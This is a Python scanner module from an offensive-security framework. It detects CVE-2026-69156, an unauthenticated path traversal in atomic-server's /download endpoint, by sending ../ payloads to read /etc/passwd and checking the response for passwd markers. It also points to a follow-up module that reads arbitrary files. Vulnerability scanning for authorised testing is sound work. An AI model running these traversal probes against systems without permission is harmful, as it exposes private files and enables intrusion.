#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-69156 — atomic-server /download path traversal detect."""

from __future__ import annotations

from kittysploit import *
from lib.protocols.http.atomic_server import Atomic_server
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.path_traversal import Path_traversal


class Module(Scanner, Http_client, Atomic_server, Path_traversal):
    __info__ = {
        "name": "atomic-server CVE-2026-69156 path traversal detect",
        "description": (
            "Unauthenticated GET /download?internalId= with ../ traversal "
            "(fixed in atomic-server 0.39.0)."
        ),
        "author": ["KittySploit Team", "LLCForge"],
        "severity": "high",
        "cve": ["CVE-2026-69156"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-69156",
        ],
        "tags": ["atomic-server", "atomicdata", "lfi", "unauth", "cve-2026-69156"],
        "agent": {
            "chain": {
                "suggested_followups": [
                    "auxiliary/admin/http/atomic_server_cve_2026_69156_file_read",
                ],
            },
        },
    }

    port = OptPort(9883, "atomic-server HTTP(S) port", required=False)

    _PATCHED_VERSION = "0.39.0"
    _PROBE_FILE = "/etc/passwd"
    _PASSWD_MARKERS = ("root:", "nobody:")

    def run(self):
        fp = self.as_fingerprint()
        if not fp.get("reachable"):
            return False
        version = str(fp.get("version") or "")
        if version and not self.version_less_than(version, self._PATCHED_VERSION):
            return False

        for payload in self.dotdot_payloads(self._PROBE_FILE, max_depth=6)[:4]:
            resp = self.as_download(payload, allow_redirects=False)
            if not resp or int(resp.status_code or 0) != 200:
                continue
            body = resp.text or ""
            if not any(m in body for m in self._PASSWD_MARKERS):
                continue
            reason = "Unauth /download traversal reads /etc/passwd"
            if version:
                reason += f" (atomic-server {version})"
            elif fp.get("is_atomic"):
                reason += " (atomic-server fingerprint)"
            self.set_info(
                severity="high",
                cve="CVE-2026-69156",
                reason=reason,
                version=version or "unknown",
                payload=payload,
            )
            return True
        return False